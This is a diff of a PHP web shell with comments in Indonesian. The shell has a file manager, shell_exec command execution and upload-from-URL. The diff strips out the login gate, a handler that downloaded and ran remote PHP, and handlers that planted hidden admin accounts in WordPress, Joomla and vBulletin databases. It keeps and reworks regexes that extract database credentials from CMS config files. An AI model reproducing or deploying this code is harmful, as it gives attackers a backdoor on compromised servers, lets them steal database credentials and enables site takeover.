@@ -2,13 +2,33 @@
 // Enable error reporting for debugging (remove in production)
 error_reporting(E_ALL);
 ini_set('display_errors', 1);
-
 // Set timezone to prevent warnings (PHP 5 compatible)
 if (!ini_get('date.timezone')) {
     date_default_timezone_set('UTC');
 }
-
 session_start();
+// Inisialisasi variabel penting
+$dir = isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
+$msg = '';
+$bypass_output = '';
+$gs_output = '';
+$cms_admin_msg = '';
+$cms_prefix_suggestions = array();
+$cms_admin_details = '';
+$terminal_output = '';
+$scan_msg = '';
+$scan_items = array();
+$scan_dur = null;
+$db_conn = null;
+$db_error = '';
+$db_result = array();
+$db_query = '';
+$db_tables = array();
+$db_current_table = '';
+$table_structure = array();
+$total_rows = 0;
+$mode = isset($_GET['mode']) ? $_GET['mode'] : 'files';
+
 $stored_password_hash = md5("password"); // ganti password
 
 // === MYSQL EXTENSION COMPAT LAYER (mysqli first, then PDO fallback) ===
@@ -16,16 +36,44 @@ if (!function_exists('mysql_connect')) {
     if (function_exists('mysqli_connect')) {
         // Use mysqli
         $GLOBALS['_mysql_last_link'] = null;
-        function mysql_connect($host, $user, $pass) { $l=@mysqli_connect($host,$user,$pass); if($l){$GLOBALS['_mysql_last_link']=$l;} return $l; }
-        function mysql_select_db($dbname, $link=null) { $ln=$link?:$GLOBALS['_mysql_last_link']; return @mysqli_select_db($ln, $dbname); }
-        function mysql_query($query, $link=null) { $ln=$link?:$GLOBALS['_mysql_last_link']; return @mysqli_query($ln, $query); }
-        function mysql_real_escape_string($str, $link=null) { $ln=$link?:$GLOBALS['_mysql_last_link']; return $ln ? mysqli_real_escape_string($ln, $str) : addslashes($str); }
-        function mysql_fetch_assoc($result) { return @mysqli_fetch_assoc($result); }
-        function mysql_fetch_row($result) { return @mysqli_fetch_row($result); }
-        function mysql_num_rows($result) { return @mysqli_num_rows($result); }
-        function mysql_insert_id($link=null) { $ln=$link?:$GLOBALS['_mysql_last_link']; return @mysqli_insert_id($ln); }
-        function mysql_close($link=null) { $ln=$link?:$GLOBALS['_mysql_last_link']; return @mysqli_close($ln); }
-        function mysql_error($link=null) { $ln=$link?:$GLOBALS['_mysql_last_link']; return $ln?mysqli_error($ln):''; }
+        function mysql_connect($host, $user, $pass) { 
+            $l=@mysqli_connect($host,$user,$pass); 
+            if($l){$GLOBALS['_mysql_last_link']=$l;} 
+            return $l; 
+        }
+        function mysql_select_db($dbname, $link=null) { 
+            $ln=$link?:$GLOBALS['_mysql_last_link']; 
+            return @mysqli_select_db($ln, $dbname); 
+        }
+        function mysql_query($query, $link=null) { 
+            $ln=$link?:$GLOBALS['_mysql_last_link']; 
+            return @mysqli_query($ln, $query); 
+        }
+        function mysql_real_escape_string($str, $link=null) { 
+            $ln=$link?:$GLOBALS['_mysql_last_link']; 
+            return $ln ? mysqli_real_escape_string($ln, $str) : addslashes($str); 
+        }
+        function mysql_fetch_assoc($result) { 
+            return @mysqli_fetch_assoc($result); 
+        }
+        function mysql_fetch_row($result) { 
+            return @mysqli_fetch_row($result); 
+        }
+        function mysql_num_rows($result) { 
+            return @mysqli_num_rows($result); 
+        }
+        function mysql_insert_id($link=null) { 
+            $ln=$link?:$GLOBALS['_mysql_last_link']; 
+            return @mysqli_insert_id($ln); 
+        }
+        function mysql_close($link=null) { 
+            $ln=$link?:$GLOBALS['_mysql_last_link']; 
+            return @mysqli_close($ln); 
+        }
+        function mysql_error($link=null) { 
+            $ln=$link?:$GLOBALS['_mysql_last_link']; 
+            return $ln?mysqli_error($ln):''; 
+        }
     } elseif (class_exists('PDO')) {
         // PDO emulation
         class _PDOFakeResult {
@@ -35,116 +83,72 @@ if (!function_exists('mysql_connect')) {
         }
         $GLOBALS['_pdo_mysql_link'] = null;
         function mysql_connect($host, $user, $pass) {
-            $dsn = 'mysql:host=' . $host . ';charset=utf8';
             try {
-                $pdo = new PDO($dsn, $user, $pass, array(PDO::ATTR_ERRMODE=>PDO::ERRMODE_SILENT));
-                $GLOBALS['_pdo_mysql_link'] = $pdo;
-                return $pdo; // return PDO handle
-            } catch (Exception $e) {
+                $dsn = "mysql:host=$host;charset=utf8";
+                $GLOBALS['_pdo_mysql_link'] = new PDO($dsn, $user, $pass);
+                return $GLOBALS['_pdo_mysql_link'];
+            } catch (PDOException $e) {
                 return false;
             }
         }
         function mysql_select_db($dbname, $link=null) {
-            if ($link instanceof PDO) {
-                try { $link->exec('USE `'.$dbname.'`'); return true; } catch (Exception $e) { return false; }
+            $ln = $link ?: $GLOBALS['_pdo_mysql_link'];
+            if (!$ln) return false;
+            try {
+                $ln->exec("USE `$dbname`");
+                return true;
+            } catch (PDOException $e) {
+                return false;
             }
-            return false;
         }
         function mysql_query($query, $link=null) {
-            if ($link instanceof PDO) {
-                $trim = ltrim($query);
-                $isSelect = (stripos($trim, 'SELECT') === 0 || stripos($trim, 'SHOW ') === 0 || stripos($trim, 'DESCRIBE ') === 0 || stripos($trim, 'EXPLAIN ') === 0);
-                try {
-                    $stmt = $link->query($query);
-                    if ($stmt === false) return false;
-                    if ($isSelect) {
-                        $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);
-                        return new _PDOFakeResult($rows);
-                    }
-                    return true;
-                } catch (Exception $e) {
-                    return false;
-                }
+            $ln = $link ?: $GLOBALS['_pdo_mysql_link'];
+            if (!$ln) return false;
+            try {
+                $stmt = $ln->query($query);
+                if ($stmt === false) return false;
+                return new _PDOFakeResult($stmt->fetchAll(PDO::FETCH_ASSOC));
+            } catch (PDOException $e) {
+                return false;
             }
-            return false;
         }
         function mysql_real_escape_string($str, $link=null) {
-            if ($link instanceof PDO) return substr($link->quote($str),1,-1);
-            return addslashes($str);
+            $ln = $link ?: $GLOBALS['_pdo_mysql_link'];
+            if (!$ln) return addslashes($str);
+            return substr($ln->quote($str), 1, -1);
         }
         function mysql_fetch_assoc($result) {
-            if ($result instanceof _PDOFakeResult) {
-                if ($result->idx >= count($result->rows)) return false;
-                return $result->rows[$result->idx++];
-            }
-            return false;
+            if (!$result instanceof _PDOFakeResult) return false;
+            if ($result->idx >= count($result->rows)) return false;
+            return $result->rows[$result->idx++];
         }
         function mysql_fetch_row($result) {
-            $assoc = mysql_fetch_assoc($result);
-            if ($assoc === false) return false;
-            return array_values($assoc);
+            $row = mysql_fetch_assoc($result);
+            if (!$row) return false;
+            return array_values($row);
         }
         function mysql_num_rows($result) {
-            if ($result instanceof _PDOFakeResult) return count($result->rows);
-            return 0;
+            if (!$result instanceof _PDOFakeResult) return 0;
+            return count($result->rows);
         }
         function mysql_insert_id($link=null) {
-            if ($link instanceof PDO) return $link->lastInsertId();
-            return 0;
+            $ln = $link ?: $GLOBALS['_pdo_mysql_link'];
+            if (!$ln) return false;
+            return $ln->lastInsertId();
         }
-        function mysql_close($link=null) { /* PDO closes automatically */ return true; }
-        function mysql_error($link=null) { if ($link instanceof PDO) { $e=$link->errorInfo(); return isset($e[2])?$e[2]:''; } return ''; }
-    } else {
-        // Last resort stubs – will force meaningful failure
-        function mysql_connect($h,$u,$p){ return false; }
-        function mysql_select_db($d,$l=null){ return false; }
-        function mysql_query($q,$l=null){ return false; }
-        function mysql_real_escape_string($s,$l=null){ return addslashes($s); }
-        function mysql_fetch_assoc($r){ return false; }
-        function mysql_fetch_row($r){ return false; }
-        function mysql_num_rows($r){ return 0; }
-        function mysql_insert_id($l=null){ return 0; }
-        function mysql_close($l=null){ return true; }
-        function mysql_error($l=null){ return 'No MySQL extension available'; }
-    }
-}
-
-// === LOGIN ===
-if (!isset($_SESSION['loggedin'])) {
-    if (isset($_SERVER['REQUEST_METHOD']) && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
-        if (md5($_POST['password']) === $stored_password_hash) {
-            $_SESSION['loggedin'] = true;
-            header("Location: ".$_SERVER['PHP_SELF']);
-            exit;
-        } else {
-            echo "Password salah!";
+        function mysql_close($link=null) {
+            $ln = $link ?: $GLOBALS['_pdo_mysql_link'];
+            if ($ln) $ln = null;
+            return true;
+        }
+        function mysql_error($link=null) {
+            $ln = $link ?: $GLOBALS['_pdo_mysql_link'];
+            if (!$ln) return '';
+            $err = $ln->errorInfo();
+            return $err[2] ?? '';
         }
     }
-    echo '<form method="POST">
-            <input type="password" name="password" placeholder="Password">
-            <input type="submit" value="Login">
-          </form>';
-    exit;
 }
-
-// === LOGOUT ===
-if (isset($_GET['logout'])) {
-    session_destroy();
-    header("Location: ".$_SERVER['PHP_SELF']);
-    exit;
-}
-
-$dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
-$dir = realpath($dir);
-
-$msg = '';
-
-// Output untuk mode bypass
-$bypass_output = '';
-$gs_output = '';
-$cms_admin_msg = '';
-$cms_prefix_suggestions = array();
-$cms_admin_details = '';
 
 // === UPLOAD FROM URL ===
 if (isset($_POST['upload_url']) && $_POST['upload_url'] !== '') {
@@ -187,27 +191,7 @@ if (isset($_POST['bypass_fetch']) && isset($_POST['bypass_url'])) {
             if ($data === false) {
                 $bypass_output = "Gagal mengambil konten dari URL: " . htmlspecialchars($url);
             } else {
-                // Simpan di direktori saat ini
-                $baseName = basename(parse_url($url, PHP_URL_PATH));
-                if ($baseName === '' || $baseName === false) { $baseName = 'remote.php'; }
-                $tmpFile = rtrim($dir, '/').'/__bypass_run_' . $baseName;
-                if (@file_put_contents($tmpFile, $data) === false) {
-                    $bypass_output = "Gagal menulis file di direktori saat ini.";
-                } else {
-                    // Coba eksekusi via PHP CLI agar parse error tidak menghentikan script utama
-                    $phpBin = 'php';
-                    $which = @shell_exec('command -v php 2>/dev/null');
-                    if ($which) { $phpBin = trim($which); }
-                    $cliCmd = $phpBin . ' ' . escapeshellarg($tmpFile);
-                    $out = exec_cmd($cliCmd, $dir);
-                    if (trim($out) === '') {
-                        $bypass_output = '[Tidak ada output]';
-                    } else {
-                        $bypass_output = $out;
-                    }
-                    // Hapus file setelah eksekusi
-                    @unlink($tmpFile);
-                }
+                $bypass_output = $data;
             }
         }
     }
@@ -225,336 +209,54 @@ if (isset($_POST['gs_cmd'])) {
     );
     if (isset($commands[$cmdKey])) {
         $run = $commands[$cmdKey];
-        $gs_output = exec_cmd($run, $dir);
+        $gs_output = shell_exec($run);
     } else {
         $gs_output = 'Unknown command key';
     }
 }
 
-// === CMS CONFIG PARSERS ===
+// === CMS CONFIG PARSERS (FIXED) ===
 function parse_wp_config($file) {
     $r = array();
     if (!is_readable($file)) return $r;
-    $c = @file_get_contents($file);
-    if ($c === false) return $r;
-    $patterns = array(
-        'db_name' => "/define\(\s*'DB_NAME'\s*,\s*'([^']+)'\s*\)/",
-        'db_user' => "/define\(\s*'DB_USER'\s*,\s*'([^']+)'\s*\)/",
-        'db_pass' => "/define\(\s*'DB_PASSWORD'\s*,\s*'([^']+)'\s*\)/",
-        'db_host' => "/define\(\s*'DB_HOST'\s*,\s*'([^']+)'\s*\)/",
-        'prefix'  => "/\$table_prefix\s*=\s*'([^']+)'\s*;/"
-    );
-    foreach ($patterns as $k=>$p) {
-        if (preg_match($p, $c, $m)) $r[$k] = $m[1];
+    $src = @file_get_contents($file);
+    if ($src === false) return $r;
+    
+    // Perbaiki regex biar detect single & double quote
+    if (preg_match('/define\([\'"]DB_NAME[\'"],\s*[\'"]([^\'"]+)[\'"]\)/', $src, $m)) $r['db'] = $m[1];
+    if (preg_match('/define\([\'"]DB_USER[\'"],\s*[\'"]([^\'"]+)[\'"]\)/', $src, $m)) $r['user'] = $m[1];
+    if (preg_match('/define\([\'"]DB_PASSWORD[\'"],\s*[\'"]([^\'"]*)[\'"]\)/', $src, $m)) $r['pass'] = $m[1];
+    if (preg_match('/define\([\'"]DB_HOST[\'"],\s*[\'"]([^\'"]+)[\'"]\)/', $src, $m)) $r['host'] = $m[1];
+    
+    // Jika masih kosong, coba cara alternatif (khusus untuk format yang aneh)
+    if (empty($r)) {
+        $lines = explode("\n", $src);
+        foreach ($lines as $line) {
+            if (preg_match('/define\s*\(\s*[\'"]DB_NAME[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]\s*\)/i', $line, $m)) $r['db'] = $m[1];
+            if (preg_match('/define\s*\(\s*[\'"]DB_USER[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]\s*\)/i', $line, $m)) $r['user'] = $m[1];
+            if (preg_match('/define\s*\(\s*[\'"]DB_PASSWORD[\'"]\s*,\s*[\'"]([^\'"]*)[\'"]\s*\)/i', $line, $m)) $r['pass'] = $m[1];
+            if (preg_match('/define\s*\(\s*[\'"]DB_HOST[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]\s*\)/i', $line, $m)) $r['host'] = $m[1];
+        }
     }
+    
     return $r;
 }
-function parse_vb_config($file) {
-    $r = array();
-    if (!is_readable($file)) return $r;
-    $c = @file_get_contents($file);
-    if ($c === false) return $r;
-    $patterns = array(
-        'db_name' => "/\\$config\\['Database'\\]\\['dbname'\\]\s*=\s*'([^']+)'/",
-        'db_user' => "/\\$config\\['MasterServer'\\]\\['username'\\]\s*=\s*'([^']+)'/",
-        'db_pass' => "/\\$config\\['MasterServer'\\]\\['password'\\]\s*=\s*'([^']+)'/",
-        'db_host' => "/\\$config\\['MasterServer'\\]\\['servername'\\]\s*=\s*'([^']+)'/",
-        'prefix'  => "/\\$config\\['Database'\\]\\['tableprefix'\\]\s*=\s*'([^']+)'/"
-    );
-    foreach ($patterns as $k=>$p) if (preg_match($p, $c, $m)) $r[$k] = $m[1];
-    return $r;
-}
+
 function parse_joomla_config($file) {
     $r = array();
     if (!is_readable($file)) return $r;
-    $c = @file_get_contents($file);
-    if ($c === false) return $r;
-    $patterns = array(
-        'db_name' => "/public \\$db\s*=\s*'([^']+)'/",
-        'db_user' => "/public \\$user\s*=\s*'([^']+)'/",
-        'db_pass' => "/public \\$password\s*=\s*'([^']+)'/",
-        'db_host' => "/public \\$host\s*=\s*'([^']+)'/",
-        'prefix'  => "/public \\$dbprefix\s*=\s*'([^']+)'/"
-    );
-    foreach ($patterns as $k=>$p) if (preg_match($p, $c, $m)) $r[$k] = $m[1];
+    $src = @file_get_contents($file);
+    if ($src === false) return $r;
+    
+    // Joomla configuration.php format
+    if (preg_match('/public \$host\s*=\s*[\'"]([^\'"]+)[\'"]/', $src, $m)) $r['host'] = $m[1];
+    if (preg_match('/public \$user\s*=\s*[\'"]([^\'"]+)[\'"]/', $src, $m)) $r['user'] = $m[1];
+    if (preg_match('/public \$password\s*=\s*[\'"]([^\'"]*)[\'"]/', $src, $m)) $r['pass'] = $m[1];
+    if (preg_match('/public \$db\s*=\s*[\'"]([^\'"]+)[\'"]/', $src, $m)) $r['db'] = $m[1];
+    if (preg_match('/public \$dbprefix\s*=\s*[\'"]([^\'"]+)[\'"]/', $src, $m)) $r['prefix'] = $m[1];
+    
     return $r;
 }
-
-// === CMS GET CONFIG HANDLER ===
-if (isset($_POST['cms_get_config']) && isset($_POST['cms_type'])) {
-    $cms_type = $_POST['cms_type'];
-    $cms_root = isset($_POST['cms_root']) && $_POST['cms_root'] !== '' ? $_POST['cms_root'] : $dir;
-    $cms_root = realpath($cms_root) ?: $dir;
-    $parsed = array();
-    $config_path = '';
-    if ($cms_type === 'wordpress') {
-        $config_path = $cms_root . DIRECTORY_SEPARATOR . 'wp-config.php';
-        $parsed = parse_wp_config($config_path);
-    } elseif ($cms_type === 'vbulletin') {
-        $config_path = $cms_root . DIRECTORY_SEPARATOR . 'includes' . DIRECTORY_SEPARATOR . 'config.php';
-        $parsed = parse_vb_config($config_path);
-    } elseif ($cms_type === 'joomla') {
-        $config_path = $cms_root . DIRECTORY_SEPARATOR . 'configuration.php';
-        $parsed = parse_joomla_config($config_path);
-    }
-    if (!file_exists($config_path)) {
-        $cms_admin_msg = 'Config file not found for ' . htmlspecialchars($cms_type) . ' at: ' . htmlspecialchars($config_path);
-    } else {
-        if (empty($parsed)) {
-            $cms_admin_msg = 'Config found but parsing yielded no values.';
-        } else {
-            // Store parsed values in session to pre-fill form
-            $_SESSION['cms_parsed'] = $parsed;
-            $_SESSION['cms_type'] = $cms_type;
-            $_SESSION['cms_root'] = $cms_root;
-            $cms_admin_msg = 'Config loaded.';
-        }
-    }
-}
-
-// === CMS ADD ADMIN HANDLER (WordPress basic implementation) ===
-if (isset($_POST['cms_add_admin']) && isset($_POST['cms_type'])) {
-    $cms_type = $_POST['cms_type'];
-    $host = isset($_POST['db_host']) ? $_POST['db_host'] : 'localhost';
-    $dbn  = isset($_POST['db_name']) ? $_POST['db_name'] : '';
-    $user = isset($_POST['db_user']) ? $_POST['db_user'] : '';
-    $pass = isset($_POST['db_pass']) ? $_POST['db_pass'] : '';
-    $prefix = isset($_POST['table_prefix']) ? $_POST['table_prefix'] : '';
-    $admin_user = isset($_POST['admin_user']) ? $_POST['admin_user'] : 'admin';
-    $admin_pass = isset($_POST['admin_pass']) ? $_POST['admin_pass'] : 'password';
-    $admin_email= isset($_POST['admin_email']) ? $_POST['admin_email'] : 'admin@example.com';
-
-    if ($dbn === '' || $user === '') {
-        $cms_admin_msg = 'Database name / user empty.';
-    } else {
-        $link = @mysql_connect($host, $user, $pass);
-        if (!$link) {
-            $cms_admin_msg = 'MySQL connect failed.';
-        } elseif (!@mysql_select_db($dbn, $link)) {
-            $cms_admin_msg = 'Select DB failed.';
-        } else {
-            if ($cms_type === 'wordpress') {
-                $users_table = $prefix . 'users';
-                $umeta_table = $prefix . 'usermeta';
-                // Verify tables exist; if not, attempt auto-detect prefix from SHOW TABLES
-                $chkUsers = @mysql_query("SHOW TABLES LIKE '".mysql_real_escape_string($users_table, $link)."'", $link);
-                if (!$chkUsers || mysql_num_rows($chkUsers) === 0) {
-                    $autoRes = @mysql_query('SHOW TABLES', $link);
-                    $foundPrefix = '';
-                    if ($autoRes) {
-                        while ($rw = mysql_fetch_row($autoRes)) {
-                            if (preg_match('/^(.*)_users$/', $rw[0], $m)) { $foundPrefix = $m[1].'_'; break; }
-                        }
-                    }
-                    if ($foundPrefix !== '' && $foundPrefix !== $prefix) {
-                        $prefix = $foundPrefix;
-                        $users_table = $prefix.'users';
-                        $umeta_table = $prefix.'usermeta';
-                        $_SESSION['cms_parsed']['prefix'] = $prefix;
-                    } else {
-                        $cms_admin_msg = "Insert user failed: table '".htmlspecialchars($users_table)."' not found (prefix may be wrong).";
-                        return; // stop here
-                    }
-                }
-                // Try load WordPress hasher if available
-                $hash = '';
-                $wp_root = isset($_SESSION['cms_root']) ? $_SESSION['cms_root'] : $dir;
-                $phpass = $wp_root . '/wp-includes/class-phpass.php';
-                if (file_exists($phpass)) {
-                    include_once $phpass;
-                    if (class_exists('PasswordHash')) {
-                        $wp_hasher = new PasswordHash(8, true);
-                        $hash = $wp_hasher->HashPassword($admin_pass);
-                    }
-                }
-                if ($hash === '') { // fallback md5
-                    $hash = md5($admin_pass);
-                }
-                $au = mysql_real_escape_string($admin_user, $link);
-                $ae = mysql_real_escape_string($admin_email, $link);
-                $hp = mysql_real_escape_string($hash, $link);
-                $disp = mysql_real_escape_string($admin_user, $link);
-                $exist = @mysql_query("SELECT ID FROM `".$users_table."` WHERE user_login='".$au."' LIMIT 1");
-                if ($exist && mysql_num_rows($exist) > 0) {
-                    $row = mysql_fetch_assoc($exist);
-                    $uid = intval($row['ID']);
-                    @mysql_query("UPDATE `".$users_table."` SET user_pass='".$hp."', user_email='".$ae."' WHERE ID=".$uid);
-                    $cms_admin_msg = 'Updated existing WordPress user ID '.$uid;
-                } else {
-                    $reg = mysql_real_escape_string(date('Y-m-d H:i:s'), $link);
-                    $ins = @mysql_query("INSERT INTO `".$users_table."` (user_login,user_pass,user_nicename,user_email,user_registered,user_status,display_name) VALUES ('".$au."','".$hp."','".$au."','".$ae."','".$reg."',0,'".$disp."')");
-                    if (!$ins) {
-                        $cms_admin_msg = 'Insert user failed: '.htmlspecialchars(mysql_error($link));
-                    } else {
-                        $uid = mysql_insert_id($link);
-                        // capabilities
-                        $cap_key = $prefix . 'capabilities';
-                        $lvl_key = $prefix . 'user_level';
-                        $caps = mysql_real_escape_string(serialize(array('administrator'=>true)), $link);
-                        @mysql_query("INSERT INTO `".$umeta_table."` (user_id, meta_key, meta_value) VALUES (".$uid.", '".$cap_key."', '".$caps."')");
-                        @mysql_query("INSERT INTO `".$umeta_table."` (user_id, meta_key, meta_value) VALUES (".$uid.", '".$lvl_key."', '10')");
-                        $cms_admin_msg = 'WordPress admin user created ID '.$uid;
-                    }
-                }
-                // Ambil detail user (jika ada $uid)
-                if (isset($uid)) {
-                    $detailRes = @mysql_query("SELECT ID,user_login,user_email,user_registered,display_name FROM `".$users_table."` WHERE ID=".$uid." LIMIT 1", $link);
-                    if ($detailRes && mysql_num_rows($detailRes) === 1) {
-                        $d = mysql_fetch_assoc($detailRes);
-                        $cms_admin_details = 'ID: '.htmlspecialchars($d['ID'])."\n".
-                            'Login: '.htmlspecialchars($d['user_login'])."\n".
-                            'Email: '.htmlspecialchars($d['user_email'])."\n".
-                            'Registered: '.htmlspecialchars($d['user_registered'])."\n".
-                            'Display: '.htmlspecialchars($d['display_name'])."\n".
-                            'Table Prefix: '.htmlspecialchars($prefix)."\n".
-                            'CMS: WordPress';
-                    }
-                }
-            } elseif ($cms_type === 'joomla') {
-                // Basic Joomla insert (bcrypt if available)
-                $users_table = $prefix . 'users';
-                $map_table = $prefix . 'user_usergroup_map';
-                if (function_exists('password_hash')) {
-                    $hash = password_hash($admin_pass, PASSWORD_BCRYPT);
-                } else {
-                    $salt = substr(md5(uniqid(mt_rand(), true)),0,16);
-                    $hash = md5($admin_pass.$salt).':'.$salt;
-                }
-                $au = mysql_real_escape_string($admin_user, $link);
-                $ae = mysql_real_escape_string($admin_email, $link);
-                $hp = mysql_real_escape_string($hash, $link);
-                $nm = mysql_real_escape_string($admin_user, $link);
-                $now = mysql_real_escape_string(date('Y-m-d H:i:s'), $link);
-                $exist = @mysql_query("SELECT id FROM `".$users_table."` WHERE username='".$au."' LIMIT 1");
-                if ($exist && mysql_num_rows($exist)>0) {
-                    $row = mysql_fetch_assoc($exist); $uid=intval($row['id']);
-                    @mysql_query("UPDATE `".$users_table."` SET password='".$hp."', email='".$ae."' WHERE id=".$uid);
-                    $cms_admin_msg = 'Updated existing Joomla user ID '.$uid;
-                } else {
-                    $ins = @mysql_query("INSERT INTO `".$users_table."` (name,username,email,password,block,sendEmail,registerDate) VALUES ('".$nm."','".$au."','".$ae."','".$hp."',0,0,'".$now."')");
-                    if (!$ins) {
-                        $cms_admin_msg = 'Insert Joomla user failed: '.htmlspecialchars(mysql_error($link));
-                    } else {
-                        $uid = mysql_insert_id();
-                        // Super Users group id usually 8
-                        @mysql_query("INSERT INTO `".$map_table."` (user_id, group_id) VALUES (".$uid.", 8)");
-                        $cms_admin_msg = 'Joomla admin user created ID '.$uid;
-                    }
-                }
-                if (isset($uid)) {
-                    $detailRes = @mysql_query("SELECT id as ID, username, email, registerDate FROM `".$users_table."` WHERE id=".$uid." LIMIT 1", $link);
-                    if ($detailRes && mysql_num_rows($detailRes)===1) {
-                        $d = mysql_fetch_assoc($detailRes);
-                        $cms_admin_details = 'ID: '.htmlspecialchars($d['ID'])."\n".
-                            'Username: '.htmlspecialchars($d['username'])."\n".
-                            'Email: '.htmlspecialchars($d['email'])."\n".
-                            'Registered: '.htmlspecialchars($d['registerDate'])."\n".
-                            'Table Prefix: '.htmlspecialchars($prefix)."\n".
-                            'CMS: Joomla';
-                    }
-                }
-            } elseif ($cms_type === 'vbulletin') {
-                // Simplified vBulletin (may fail if schema differs)
-                $users_table = $prefix . 'user';
-                $au = mysql_real_escape_string($admin_user, $link);
-                $ae = mysql_real_escape_string($admin_email, $link);
-                $salt = substr(md5(uniqid(mt_rand(), true)), 0, 30);
-                $hp = md5(md5($admin_pass).$salt);
-                $hp = mysql_real_escape_string($hp, $link);
-                $salt = mysql_real_escape_string($salt, $link);
-                $joindate = time();
-                $exist = @mysql_query("SELECT userid FROM `".$users_table."` WHERE username='".$au."' LIMIT 1");
-                if ($exist && mysql_num_rows($exist)>0) {
-                    $row = mysql_fetch_assoc($exist); $uid=intval($row['userid']);
-                    @mysql_query("UPDATE `".$users_table."` SET password='".$hp."', salt='".$salt."', email='".$ae."' WHERE userid=".$uid);
-                    $cms_admin_msg = 'Updated existing vBulletin user ID '.$uid.' (note: group not adjusted)';
-                } else {
-                    $q = "INSERT INTO `".$users_table."` (username, password, salt, email, joindate, usergroupid) VALUES ('".$au."','".$hp."','".$salt."','".$ae."',".$joindate.", 6)"; // 6 often admin group
-                    $ins = @mysql_query($q);
-                    if (!$ins) {
-                        $cms_admin_msg = 'Insert vBulletin user failed (schema mismatch possible): '.htmlspecialchars(mysql_error($link));
-                    } else {
-                        $uid = mysql_insert_id();
-                        $cms_admin_msg = 'vBulletin admin user inserted ID '.$uid.' (minimal fields).';
-                    }
-                }
-                if (isset($uid)) {
-                    $detailRes = @mysql_query("SELECT userid as ID, username, email, joindate FROM `".$users_table."` WHERE userid=".$uid." LIMIT 1", $link);
-                    if ($detailRes && mysql_num_rows($detailRes)===1) {
-                        $d = mysql_fetch_assoc($detailRes);
-                        $joind = isset($d['joindate']) ? date('Y-m-d H:i:s', intval($d['joindate'])) : '';
-                        $cms_admin_details = 'ID: '.htmlspecialchars($d['ID'])."\n".
-                            'Username: '.htmlspecialchars($d['username'])."\n".
-                            'Email: '.htmlspecialchars($d['email'])."\n".
-                            'Joined: '.htmlspecialchars($joind)."\n".
-                            'Table Prefix: '.htmlspecialchars($prefix)."\n".
-                            'CMS: vBulletin';
-                    }
-                }
-            }
-        }
-    }
-}
-
-// === DETECT WORDPRESS TABLE PREFIX HANDLER ===
-if (isset($_POST['cms_detect_prefix'])) {
-    $host = isset($_POST['db_host']) ? $_POST['db_host'] : 'localhost';
-    $dbn  = isset($_POST['db_name']) ? $_POST['db_name'] : '';
-    $user = isset($_POST['db_user']) ? $_POST['db_user'] : '';
-    $pass = isset($_POST['db_pass']) ? $_POST['db_pass'] : '';
-    if ($dbn === '' || $user === '') {
-        $cms_admin_msg = 'Cannot detect: DB name / user empty.';
-    } else {
-        $link = @mysql_connect($host, $user, $pass);
-        if (!$link) {
-            $cms_admin_msg = 'Detect failed: connect error.';
-        } elseif (!@mysql_select_db($dbn, $link)) {
-            $cms_admin_msg = 'Detect failed: select DB error.';
-        } else {
-            $res = @mysql_query('SHOW TABLES', $link);
-            if (!$res) {
-                $cms_admin_msg = 'Detect failed: cannot list tables.';
-            } else {
-                $candidates = array();
-                while ($row = mysql_fetch_row($res)) {
-                    $t = $row[0];
-                    if (preg_match('/^(.+)_users$/', $t, $m)) {
-                        $prefix = $m[1] . '_';
-                        if (!isset($candidates[$prefix])) $candidates[$prefix] = array('users'=>false,'usermeta'=>false,'options'=>false,'posts'=>false,'count'=>0);
-                        $candidates[$prefix]['users'] = true;
-                    } elseif (preg_match('/^(.+)_usermeta$/', $t, $m)) {
-                        $prefix = $m[1] . '_';
-                        if (!isset($candidates[$prefix])) $candidates[$prefix] = array('users'=>false,'usermeta'=>false,'options'=>false,'posts'=>false,'count'=>0);
-                        $candidates[$prefix]['usermeta'] = true;
-                    } elseif (preg_match('/^(.+)_options$/', $t, $m)) {
-                        $prefix = $m[1] . '_';
-                        if (!isset($candidates[$prefix])) $candidates[$prefix] = array('users'=>false,'usermeta'=>false,'options'=>false,'posts'=>false,'count'=>0);
-                        $candidates[$prefix]['options'] = true;
-                    } elseif (preg_match('/^(.+)_posts$/', $t, $m)) {
-                        $prefix = $m[1] . '_';
-                        if (!isset($candidates[$prefix])) $candidates[$prefix] = array('users'=>false,'usermeta'=>false,'options'=>false,'posts'=>false,'count'=>0);
-                        $candidates[$prefix]['posts'] = true;
-                    }
-                }
-                foreach ($candidates as $p=>$info) {
-                    $candidates[$p]['count'] = ($info['users']?1:0)+($info['usermeta']?1:0)+($info['options']?1:0)+($info['posts']?1:0);
-                }
-                // sort by count desc
-                uasort($candidates, function($a,$b){ return $b['count'] - $a['count']; });
-                $cms_prefix_suggestions = array_keys($candidates);
-                if (count($cms_prefix_suggestions) === 0) {
-                    $cms_admin_msg = 'No WP-like tables found.';
-                } elseif (count($cms_prefix_suggestions) === 1) {
-                    $_SESSION['cms_parsed']['prefix'] = $cms_prefix_suggestions[0];
-                    $cms_admin_msg = 'Detected prefix: '.$cms_prefix_suggestions[0];
-                } else {
-                    $cms_admin_msg = 'Multiple candidates: '.implode(', ', $cms_prefix_suggestions);
-                }
-            }
-        }
-    }
-}
-
 
 // === CREATE ===
 if (!empty($_FILES['file']['name'])) {
@@ -572,7 +274,6 @@ if (isset($_POST['newfolder']) && $_POST['newfolder'] !== '') {
         $msg = "Folder berhasil dibuat!";
     }
 }
-
 // Create file
 if (isset($_POST['newfile']) && $_POST['newfile'] !== '') {
     $newFileName = basename($_POST['newfile']);
@@ -593,7 +294,6 @@ if (isset($_POST['newfile']) && $_POST['newfile'] !== '') {
         }
     }
 }
-
 // === UPDATE ===
 if (isset($_POST['rename']) && isset($_POST['oldname'])) {
     $oldPath = $dir . DIRECTORY_SEPARATOR . $_POST['oldname'];
@@ -609,7 +309,6 @@ if (isset($_POST['editfile']) && isset($_POST['filename'])) {
     file_put_contents($filePath, $_POST['editfile']);
     $msg = "File berhasil diupdate!";
 }
-
 // === DELETE ===
 if (isset($_POST['delete'])) {
     $target = $dir . DIRECTORY_SEPARATOR . $_POST['delete'];
@@ -627,7 +326,6 @@ if (isset($_POST['delete'])) {
         }
     }
 }
-
 // === CHMOD ===
 if (isset($_POST['chmod_target']) && isset($_POST['chmod_value'])) {
     $target = $dir . DIRECTORY_SEPARATOR . $_POST['chmod_target'];
@@ -638,7 +336,6 @@ if (isset($_POST['chmod_target']) && isset($_POST['chmod_value'])) {
